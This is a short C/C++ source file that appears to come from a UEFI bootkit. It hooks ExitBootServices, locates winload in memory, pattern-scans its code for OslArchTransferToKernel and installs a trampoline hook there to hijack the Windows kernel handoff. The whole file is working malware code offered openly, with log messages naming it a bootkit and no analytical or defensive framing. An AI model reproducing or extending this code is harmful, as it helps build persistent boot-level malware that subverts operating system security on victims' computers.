#include "ExitBootServices.h"

EFI_STATUS EFIAPI ExitBootServicesHook(IN EFI_HANDLE ImageHandle, IN UINTN MapKey)
{
    SET_BACKGROUND(EFI_WHITE | EFI_BACKGROUND_RED);
    CLEAR_SCREEN();
    Log("Bootkit hook-chain sequence started");
    SLEEP(500);

    global::winload = memory::get_image_base(global::RetExitBootServices);
    if (!global::winload) 
    {
        Error("Can't find winload base!");
    }
    Log("Successfully found winload base");

    global::OslArchTransferToKernel = memory::scan_section(global::winload, ".text", (uint8_t*)&OslArchTransferToKernelPattern, sizeof(OslArchTransferToKernelPattern));
    if (!global::OslArchTransferToKernel)
    {
        Error("Can't find OslArchTransferToKernel address!");
    }
    Log("Successfully found OslArchTransferToKernel address");

    trampoline::Hook(global::OslArchTransferToKernel, (uint64_t) OslArchTransferToKernelHook, (uint8_t*) &global::OslArchTransferToKernelData);

    Log("ExitBootServices stage complete");
    global::BootServices->ExitBootServices = (EFI_EXIT_BOOT_SERVICES)global::ExitBootServices;
    return global::ExitBootServices(ImageHandle, MapKey);
}
